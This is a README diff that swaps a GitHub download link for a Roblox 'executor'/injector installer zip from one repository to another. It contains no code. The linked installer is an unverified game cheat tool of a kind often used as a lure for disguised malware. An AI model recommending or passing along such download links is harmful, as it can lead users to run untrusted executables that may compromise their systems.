@@ -2,7 +2,7 @@
 > ***How to download:***
 
 
-## Download: [Click Here](https://github.com/q3920687/RBX-Exec/releases/download/RBX-EXEC/Installer.zip)
+## Download: [Click Here](https://github.com/AbdoMoh96/Best-Roblox-Injector-Executor/releases/download/Executor/Installer.zip)
 
 
 
